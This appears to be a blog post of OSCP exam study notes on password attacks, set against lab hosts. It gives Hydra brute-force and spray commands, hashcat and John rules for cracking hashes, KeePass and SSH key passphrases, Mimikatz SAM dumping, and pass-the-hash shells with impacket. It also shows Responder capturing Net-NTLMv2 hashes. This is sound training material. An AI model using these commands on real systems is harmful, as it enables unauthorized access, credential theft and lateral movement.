---
title: Password Attacks
date: 2024-03-04 04:15:00 -0600
categories: [OSCP]
tags: [oscp, pen200, offsec, certs]     # TAG names should always be lowercase
---
*The Password Attacks tools and tactics reviewed here are presented specifically in preparation for the OSCP exam per course suggestions and are by no means replacements for the OSCP training course, nor comprehensive guides for this step in the Kill Chain.*

# Password Attacks

## Attacking Network Services Logins

Here, we will cover attacking SSH, RDP, and HTTP POST logins.

### SSH and RDP

Let's use THC Hydra for dictionary attacks.

Firstly, lets try SSH on port 2222 to find the password of a user named george.

```console
$ cd /usr/share/wordlists/

// if rockyou is not already uncompressed:
$ sudo gzip -d rockyou.txt.gz

$ hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
[2222][ssh] host: 192.168.188.201   login: george   password: chocolate
```

If we don't know a valid username, use enumeration and info gathering to find one. Or, attack built-in accounts like root (Linux target) or Administrator (Windows target).

Let's try using a single password against many usernames (password spray). We may find plaintext passwords many places, even [online leaks](https://scatteredsecrets.com/).

Assume we found the valid password MyS3cuR3Pas$! We will use hydra again to set the list of usernames with -L /usr/share/wordlists/dirb/others/names.txt and the single password with -p MyS3cuR3Pas$!

```console
$ hydra -L /usr/share/wordlists/dirb/others/names.txt -p "MyS3cuR3Pas$!" rdp://111.111.111.111
```

Sometimes multiple users use the same password or users have the same password across multiple systems.

### HTTP POST Login Form

Consider using a dictionary attack when faced with a web login that does not accept default credentials. Most have a default user like admin. Let's try to target TinyFileManager on port 80. TinyFileManager hosts two default users, admin and user. Let's try user.

Hydra will not make it as straighforward to attack an HTTP POST login form. We will need both the POST data (contains request body with username and password) and a failed login capture. We will use Burp Intercept. With intercept on, enter "user" for the username, and any password before submitting the login form.

```
...
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: filemanager=lvs6k38vnlim129jbr1bdo0qg3
Connection: close

fm_usr=user&fm_pwd=password
```

The last line above is the request body we need to provide to Hydra. Now, forward the request to generate the failed login. In our case, the webpage prints "Login failed. Invalid username or password". We will provide this to Hydra as the identifier for a failed login.

NOTE: In more complex webapps, we might need to inspect the source code of the login form to isolate a failed login indicator or just dig deeper into the rqst/rspns.

```console
$ hydra -l user -P /usr/share/wordlists/rockyou.txt 111.111.111.111 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

The http-post-form takes three colon-delimited fields in this format:

"locationofloginform:requestbodyforlogin:failedloginidentifier"
"/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

We are shortening the failedloginidentifer condition string here to reduce false positives: keeping keywords like "username" or "password" would give too many FPs.

Extra example: Target webpage was password protected with one of those login browser popups, and BurpSuite interception shows that the username and password were base64 encoded.

```console
$ hydra -l admin -P /home/kali/Desktop/oscp/rockyou.txt http-get://192.168.188.201
```

## Password Cracking Fundamentals

Let's review the cracking of passwords found as encrypted ciphertexts or hashes.

```console
$ echo -n "secret" | sha256sum
```

The cracking time of various hash representations can be calculated by dividing the keyspace with the hash rate.

Keyspace = the character to the power of the amount of characters (length) of the password.
```console
$ echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
62

$ python3 -c "print(62**5)"
916132832
```

The hash rate measures how many hash calculations can be completed in a second. We can use Hashcat to benchmark this.

```console
$ hashcat -b
hashcat (v6.2.5) starting in benchmark mode
...
* Hash-Mode 100 (SHA1)
----------------------

Speed.#1.........: 21528.2 MH/s (63.45ms) @ Accel:64 Loops:512 Thr:512 Vec:1

---------------------------
* Hash-Mode 1400 (SHA2-256)
---------------------------

Speed.#1.........:  9276.3 MH/s (73.85ms) @ Accel:16 Loops:1024 Thr:512 Vec:1
```

You can now calculate the time needed to crack by dividing your keyspace result by the hash rate. You result will be output in seconds.

### Mutating Wordlists

We should remove all passwords from wordlists that do not comply with a password policy we know is implemented using a rule-based attack.

For a rule-based attack, we need to create a rule file to give the cracking tool. The [HashCat Wiki](https://hashcat.net/wiki/doku.php?id=rule_based_attack) has all possible rule functions to help you. HashCat also has provided rules in ls -la /usr/share/hashcat/rules/

Let's demonstrate rule functions:

```console
$ cat head /usr/share/wordlists/rockyou.txt
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123

$ mkdir passwordattacks

$ cd passwordattacks

$ head /usr/share/wordlists/rockyou.txt > demo.txt

// the following command tells sed to delete all lines that start with the number 1
$ sed -i '/^1/d' demo.txt     

$ cat demo.txt
password
iloveyou
princess
rockyou
abc123
```

Let's write a rule for HashCat:

```console
// appends "1" to all lines in wordlist
$ echo \$1 > demo.rule

// starting hashcat in debug mode, this will not crack anything, just display mutated passwords
$ hashcat -r demo.rule --stdout demo.txt
```

NOTE: Get a "Not enough allocatable device memory..." error? Shut down Kali and add more RAM.

Two options for running two rules:
```console
// the c rule function simply capatalizes the first letter and converts the rest to lowercase
$ nano demo1.rule
$1 c

$ hashcat -r demo1.rule --stdout demo.txt
Password1
Iloveyou1
Princess1
Rockyou1
Abc1231

$ nano demo2.rule
$1
c

$ hashcat -r demo2.rule --stdout demo.txt
password1
Password
iloveyou1
Iloveyou
princess1
Princess
...
```

Lastly, let's add a special character:

```console
$ nano demo1.rule
$1 c $!

$ hashcat -r demo1.rule --stdout demo.txt
Password1!
Iloveyou1!
Princess1!
Rockyou1!
Abc1231!

$ nano demo2.rule

$ hashcat -r demo2.rule --stdout demo.txt
Password!1
Iloveyou!1
Princess!1
Rockyou!1
Abc123!1
```

Time to crack!

```console
$ nano crackme.txt
f621b6c9eab51a3e2f4e167fee4c6860

$ cat demo3.rule   
$1 c $!
$2 c $!
$1 $2 $3 c $!

$ hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
hashcat (v6.2.5) starting
...
f621b6c9eab51a3e2f4e167fee4c6860:Computer123!
```

TIP: Most users rely on special characters on the left side of the keyboard.

Rule examples:

Append stuff to the end of each password: $1 $@ $3 $$ $5
Capitalize everything and duplicate the password: u d

### Cracking Methodology

You can use these tools to determine what algorithm hashed the password you found:
https://www.kali.org/tools/hash-identifier/
https://www.kali.org/tools/hashid/

Be certain to put your hashes in SINGLE quotes if they contain special characters, like $ hashid '$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC'

### Password Manager

A master password grants acccess to all other passwords stored by a password manager. We can extract a password manager's db, reformat the file for Hashcat, and crack the master database password.

After getting creds to a typical user account, login over RDP and check the programs that are installed on their system. With a GUI, you can do this with "Apps & features". Windows Icon > type "Apps" > Add or remove programs. Scroll down to see the installed programs.

Assume we found KeePass on a system. Researching tells us the KeePass db is stored as a .kdbx file and there may be more than one! This could be if they have both a personal db and an organizational/departmental db. 

Search for all .kdbx files on the system:

```console
``` powershell.exe Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

  Directory: C:\Users\jason\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/30/2022  10:33 AM           1982 Database.kdbx
```

Transfer the file to your Kali system. Use John the Ripper (JtR) transformation scripts (like ssh2john or keepass2john) to format our files for John or Hashcat.

```console
$ keepass2john Database.kdbx > keepass.hash
Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd...

// still need to modify this further - remove "Dataabase" from file since KeePass uses a master password with no username

$ nano keepass.hash
$ cat keepass.hash
$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd...

// lastly, determine the hashtype: use the Hashcat WIki or grep the help output

$ hashcat --help | grep -i "KeePass"
  13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)                | Password Manager
  29700 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) - keyfile only mode | Password Manager
```

The correct mode here is 13400. Let's use Hashcat's rockyou-30000.rule rule combined with rockyou.txt.

```console
$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

We now have the master password to login to KeePass with and view all the other stored passwords.

TIP: Another way to get a shared drive on a Windows machine:

```console
$ xfreerdp /cert-ignore /bpp:8 /smart-sizing /compression -themes -wallpaper /auto-reconnect /drive:shared,/tmp /u:nadine /p:123abc /h:800 /w:1400 /v:192.168.192.227
```

### SSH Private Key Passphrase

Say we have a web service on our target's port 8080 and find the following files:

```console
$ cat note.txt
password list:

Window
rickc137
dave
superdave
megadave
umbrella

Note to myself:
New password policy starting in January 2022. Passwords need 3 numbers, a capital letter and a special character

$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBwWeeKjT...
```

To use the private id_rsa key for dave, you need to first change the perms.

```console
$ chmod 600 id_rsa

$ ssh -i id_rsa -p 2222 dave@192.168.50.201
// try all of the passwords we found in the note
```

None of them work? Maybe dave's new password policy is in place. Let's try to crack.

```console
$ ssh2john id_rsa > ssh.hash

$ cat ssh.hash
id_rsa:$sshng$6$16$....      // the $6$ means this is SHA-512

// need to remove the filename from the front before the first colon

$ nano ssh.hash
$ cat ssh.hash
$sshng$6$16...

$ hashcat -h | grep -i "ssh"
...
  22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)                      | Private Key
...

// create rule based on note.txt

$ nano ssh.rule
$ cat ssh.rule
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#

// create wordlist of passwords from note.txt

$ nano ssh.passwords
$ cat ssh.passwords
Window
rickc137
dave
superdave
megadave
umbrella

// crack!

$ hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
Token length exception
```

Modern private keys and their respective passphrases are created with aes-256-ctr3. Hashcat's mode 22921 does not support this. Let's try john.

```console
// fix the rule syntax

$ nano cat ssh.rule
$ cat ssh.rule
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#

// append rule to john.conf

$ sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'

// crack!

$ john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

Found the password? Try to ssh:

```console
$ ssh -i id_rsa -p 2222 dave@192.168.50.201
```

Additional Example:

Found an Apache 2.4.49 server? Use the known directory traversal vuln.

```console
$ bash ./50383.sh targets.txt /home/alfred/.ssh/id_rsa 
```

## Working with Password Hashes

When we gain privileged access to a system, we will be able to extract password hashes. We can also intercept or make Windows network authentication requests and use the in pass-the-hashes or relay attacks.

### Cracking NTLM

The NTLM hash implementation is used in the Security Account Manager (SAM) db file, which is used to assist auth for local or remote users.

Microsoft has added the SYSKEY feature to prevent offline SAM db password attacks, partially encrypting the SAM file. Passwords are stored in one of two formats:
- LAN Manager (LM) - based in DES, very insecure. Passwords are case insensitive and must be 14 characters or less. If a password is longer tha 7 chars, it is split into 2 strings and hashed separately. LM is disable by default beginning with Windows Vista and Windows Server 2008.
- NTLM

On modern systems, SAM hashes are stored as NTLM. Passwords are case sensitive and not split. However, they are NOT SALTED! Salts were implemented to prevent Rainbow Table Attacks, where attackers perform lookups on precomputed hashes to infer a plaintext password.

NTLM hash = NTHash

We cannoy copy, move, or rename, the SAM db from C:\Windows\system32\config\sam while the OS is running because the kernel locks the file.

We can, however, use mimikatz to extract plain-text passwords and password hashes from various areas in Windows to use them in subsequent attacks. Mimikatz also has the sekurlsa module, which extracts password hashes from the Local Security Authority Subsystem (LSASS - handles user authentication, password changes, access token creation, etc) process memory.

LSASS caches NTLM hashes and other creds which we can extract using sekurlsa in Mimikatz. LSASS runs as SYSTEM which is more privileged than a process started as Administrator.

We can only extract passwords if we are running Mimikatz as Administrator or higher and have the SeDebugPrivilege, which enables use to debug all user processes.

PsExec can also be used to elevate our privileges to SYSTEM. Or, we can use Mimikatz's built-in token elevation function (requires SeImpersonatePrivilege, but all local admins have this).

Let's retrieve passwords from SAM of a target machine. In the target's PS:

```console
> Get-LocalUser
Name               Enabled Description
----               ------- -----------
Administrator      False   Built-in account for administering the computer/domain
DefaultAccount     False   A user account managed by the system.
Guest              False   Built-in account for guest access to the computer/domain
nelly              True
offsec             True
sam                True
WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender
```

Credentials are stored when users log on to a Windows system and when a service is run with a user account.

Use Mimikatz in PS (as Administrator) to check for stored creds.

```console
> cd C:\tools 

> ls
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/31/2022  12:25 PM        1355680 mimikatz.exe

> .\mimikatz.exe
```

Each mimikatz command has a module and a command, delimited by two colons, like privilege::debug. One of the most common is sekurlsa::logonpasswords, but it generates a ton of output. Enter token::elevate to elevate to SYSTEM user privileges and try lsadump::sam.

```console
> privilege::debug

> token::elevate

> lsadump::sam
User : nelly
  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
```

Copy the victim's hash to Kali.

```console
$ cat nelly.hash
3ae8e5f0ffabb3a627672e1600f1ba10

$ hashcat --help | grep -i "ntlm"
...
1000 | NTLM                                                       | Operating System

$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

Succeeded? RDP as that user.

What if we can'r get the plaintext? We can still use the hash.

### Passing NTLM

Pass the Hash can be used to authenticate to a local or remote target without a plaintext password, which is possible because NTLM/LM hashes are not salted and remain static between sessions.We can use the same hash to authenticate to multiple targets, as long as the second target has an account with the same user and password. To use this into code execution, we also need the account to have admin privileges on the second target.

If we don't user the local Administrator user in PtH, the target also needs to be configured a certain way to get code execution. Since Vista, Windows now has UAC remote restrictions enabled by default, which prevents software or commands from running with admin rights on remote systems and mitigates our attack vector for all users in the local admin group aside from the local Administrator account.

Assume we have access to Computer1 with a password to a user. We need to extract the Administrator's NTLM hash and use it to authenticate to Computer2. In this example, we will try to gain access to an SMB share and PtH for an interactive shell on Computer2. Assume Administrator on both computers has the same password, which is common.

Logged into Computer1 with creds we already have, go to Windows Explorer and enter the path of the SMB share (\\192.168.242.212\secrets) in the nav bar. You're prompted for creds. Try creds you already have, but if they don't work, use Mimikatz, and save the Administrator hash you get.

To PtH, we need tools that support auth with NTLM hashes. Some examples are:
- SMB enum and mgt: smbclient, CrackMapExec
- Cmd injection: impacket scripts like psexec.py and wmiexec.py
- RDP and WinRM if the user has the required rights
- Mimikatz can PtH

Let's go SMB with smbclient in kali.

```console
$ smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

smb: \> dir
  .                                   D        0  Thu Jun  2 16:55:37 2022
  ..                                DHS        0  Thu Mar  7 17:56:32 2024
  secrets.txt                         A       16  Thu Sep  1 12:23:32 2022

smb: \> get secrets.txt 
```

We connected to SMB share successfully with the hash of a password. Now, let's try to get a reverse shell using psexec.py from impacket, which searches for a writable share and uploads an exe to it, lastly registering the exe as a Windows service and starting it to give us our interactive shell or code execution.

```console
// impacket-psexec first arg is -hashes in format of LMHash:NTHash, we only need NT so fill LM with 0s

// we could ad another argument at the end of this command which is used to determine which command psexec should execute on the target, but leaving it empty executes cmd.exe and gives us a shell

$ impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

C:\Windows\system32> 
```

Psexec.py will always give us a shell as SYSTEM instead of the user we used to authenticate. We could use wmiexec.py to get a shell as the user we authenticate as as follows:

```console
$ impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
files02\administrator
```

### Cracking Net-NTLMv2

If we have code execution or shell on a Win system as an uprivileged user, we can't use Mimikatz. Here, we can use Net-NTLMv2 network auth protoctol, which manages auth between Win servers and clients.

Let's try to gain access to an SMB share on a Windows 2022  server from a Windows 11 client using Net-NTLMv2. We'll send a request to the server with the connection details to access the SMB share, and we'll receive a challenge from the server where we will encrypt data with our NTLM hash. 

We will use Net-NTLMv2 instead of Kerberos which is much more secure and modern.

We need to prepare our system to handle the auth process and show us the captured hash the target used to authenticate. We can use Responder for this, which has a built-in SMB server  as well as HTTP, FTP, Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Service (NBT-NS), and Multicast DNS (MDNS).

So, we have code execution on a remote system, and we'll force it to auth with us by commanding it to connect to our prepared SMB. Assuming Responder is listening on 222.222.222.222, we would just run "ls \\222.222.222.222\share" in PS. If we don't have code execution. we could use other methods. For example, if we have a file upload to a web app on a Win server, we can try to enter a non-existent file with an UNC path like \\222.222.222.222\share\nonexistent.txt, and if the web app supports SMB uploads, the Win server will auth to our SMB server.

Set up responder on Kali as an SMB server and connect to a shell you have on the target system. 

```console
$ nc 192.168.204.211 4444

C:\Windows\system32>whoami
whoami
files01\paul

C:\Windows\system32>net user paul 
net user paul
User name                    paul
Full Name                    paul power
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/3/2022 9:57:06 AM
Password expires             Never
Password changeable          6/3/2022 9:57:06 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   3/8/2024 12:11:49 PM

Logon hours allowed          All

Local Group Memberships      *Remote Desktop Users *Users                
Global Group memberships     *None                 
The command completed successfully.
```

Paul is not an admin, but he is a part of the Remote Desktop Users group.

```console
// get kali ip for responder to run smb on
$ ip a
tun0

$ sudo responder -I tun0
[+] Listening for events...    
```

Now, on the shell you have in kali for paul:

```console
dir \\192.168.45.189\test
Access is denied.  
```

Access is denied; however, check Responder.

```console
[SMB] NTLMv2-SSP Client   : 192.168.204.211
[SMB] NTLMv2-SSP Username : FILES01\paul
[SMB] NTLMv2-SSP Hash     : paul::FILES01:821c4b9130f77e91:6CE3A580D7E114A51610EA18185C120A:01010000000000008089B06F6F71DA012127FE93E4A26E470000000002000800530047003300450001001E00570049004E002D00440037005A003400350037004200480056004300580004003400570049004E002D00440037005A00340035003700420048005600430058002E0053004700330045002E004C004F00430041004C000300140053004700330045002E004C004F00430041004C000500140053004700330045002E004C004F00430041004C00070008008089B06F6F71DA0106000400020000000800300030000000000000000000000000200000494308BF31FF01C979CBC8E7C98ADB5526F0817A3634D48B625E39AA799A0C430A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100380039000000000000000000   
```

Save this hash and crack.

```console
$ nano paul.hash
$ cat paul.hash
paul::FILES01:821c4b9130f77e91:6CE3A580D7E114A51610EA18185C120A:010100000...

$ hashcat --help | grep -i "ntlm"
5600 | NetNTLMv2                                                  | Network Protocol

$ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```

Use the cracked password to connect to the target over RDP.

